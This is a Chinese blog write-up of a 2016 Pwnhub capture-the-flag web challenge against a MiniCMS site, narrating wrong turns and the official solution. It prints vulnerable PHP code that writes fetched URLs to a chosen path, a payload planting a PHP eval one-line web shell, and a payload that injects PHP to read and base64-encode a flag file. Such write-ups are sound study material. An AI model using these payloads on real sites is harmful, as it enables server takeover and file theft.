---
title: Pwnhub外传第一关总结
categories:
  - CTF
tags:
  - CTF
  - WP
toc: true 文章目录
author: BlBana
date: 2016-12-15 00:52:55
description:
comments:
original:
permalink:
---

## Pwnhub 又一个要被黑掉的网站(总结)

> 今天晚上pwnhub又放了一道新题，和小伙伴一起来做，发现自己脑洞还是不够大欸，一根筋了，虽然没有做出来，但是已经离正确的答案不远了，哈哈~一道题让我学到了不少知识点，现在来总结一下。

<!-- more -->

### 0x01 开始
拿到题后，首先进入了一个比较简洁cms，具有一些简单的文章发布功能。
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/1.png)
大概在里面点了一会，浏览源码发现了一个可疑的地方。
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/2.png)
发现了一个链接，看见了file和path两个参数，首先想到的是文件包含漏洞，先试了一下，打算先看看别的地方（这里就走上了弯路）

### 0x02 弯路
在点击了订阅以后，发现了这么一个页面
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/3.png)
> 在这个页面中获得了一些，有关于这款CMS的一些信息，这个CMS叫MiniCMS，从对应的官网上下载了网站的源码，在本地部署了起来。

我以为这道题是一个代码审计的题目，发现这个网站是有后台的，于是去看了看登陆那一块的代码，发现非常简单。这个CMS是没有后台的，所有管理员的相关信息都存放在一个配置文件的数组当中，Cookies就是**"username"_"password"的md5值**。
```php
if (isset($_COOKIE['mc_token'])) {
  $token = $_COOKIE['mc_token'];

  if ($token == md5($mc_config['user_name'].'_'.$mc_config['user_pass'])) {
    Header("Location:{$mc_config['site_link']}/mc-admin/post.php");
  }
}

if (isset($_POST['login'])) {
  if ($_POST['user'] == $mc_config['user_name'] 
  && $_POST['pass'] == $mc_config['user_pass']) {
    setcookie('mc_token', md5($mc_config['user_name'].'_'.$mc_config['user_pass']));
    Header("Location:{$mc_config['site_link']}/mc-admin/post.php");
  }
}
```
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/4.png)
这时我的思路是，利用刚才发现的那个文件包含漏洞来读管理员的配置文件，然后登陆后台找flag...我嘞个去，都跑偏了不知道多少！！！

尝试包含了很多次，读取文件，命令执行都没有什么结果（**其实离开始的非预期漏洞已经不远了，只需要再访问一下path那个文件，就能得到想要的了**），发现没什么结果的时候，准备换一个思路试试。

### 0x03 新思路
这个时候回到了刚才看见那个`console.log('logo.jpg update sucess')`，想到了logo.jpg是不是由test.png复制而来的，但是没有去尝试一下，重新构造上传文件名来判断自己的想法是否正确。

这个时候思路又断掉了，之后脑洞大开，想到了是不是利用file远程文件读取来覆盖本地的某个文件来达到目的，但是发现file参数里如果开头不是http://127.0.0.1:8888/ 的话，就不会显示更新成功，但是只要file参数只要符合要求，不管path参数添什么，都可以正常的回显更新成功，并且path的内容会显示在**update success**之前。
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/5.png)
这时候将显示出来的内容搜索了一下，发现了一道类似的题目，又有了思路。
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/6.png)
[题目链接](http://webcache.googleusercontent.com/search?q=cache:iWybbYHM5vQJ:syclover.sinaapp.com/%20&cd=2&hl=zh-CN&ct=clnk&gl=cn)

想的是构造这么一句payload：
`image.php?path=blbana.php&file=http://127.0.0.1:8888/image.php?path=<?php @eval($_POST['he11']);?>&file=http://127.0.0.1:8888/image.php`
先打开image.php将内容写到`<?php @eval($_POST['he11']);?>`，本地测试会报错，但是一句话会显示出来，然后第二次将错误的页面源码写入的文件中，从而GetShell。
![Alt text](http://blog.blbana.cc/img/hexo/pwnhub%E5%A4%96%E4%BC%A0%E7%AC%AC%E4%B8%80%E5%85%B3/7.png)
但是尝试了很多次，caidao连接显示200，但是没办法连接上，又尝试直接访问我的文件，没有显示404，说明我创建了文件，但是实际内容没有写进去，最后看了大佬的writeup才知道，这个页面的报错已经关掉，无法通过将报错页面写入文件的方式来Getshell。
```php
<?php
ini_set("display_errors", "Off"); error_reporting(E_ALL);
$url = $_GET['file'];
$path = $_GET['path'];
if (strpos($path, '..')>‐1)
{
 die("error");
}
if (strpos($path, '<')>‐1)
{
 die("error");
}
if (strpos($url, 'http://127.0.0.1:8888/') == 0 )
{
 file_put_contents($path, file_get_contents($url));
 echo "console.log('".$path." update sucess!')";
}
?>
```
当时还尝试了文件包含，命令执行各种姿势，都不能得到flag，最后题目就关闭了 ...

### 0x04 正确思路
[官方WP](http://pwnhub.cn/media/writeup/71/eb87f081-824f-4a8e-a87a-bd4b1119c385_1651dacd.pdf)

正确的思路是在，页面`http://54.223.231.220/?date/2016-12%3Cimg/src=1%3E/`中构造XSS，改变前端的显示，再将该页面的源码写入到一个文件中，从而读到flag，payload如下：
`http://54.223.231.220/image.php?file=http://127.0.0.1:8888/?date/2016-12<?php print base64_encode(file_get_contents("flag.php"))?>&path=file`

### 0x05 知识点
1. file_get_contents()是可以进行文件包含漏洞的利用的；
2. file_get_contents()可以读取一个页面的源码，从而改变前端显示来getshell。







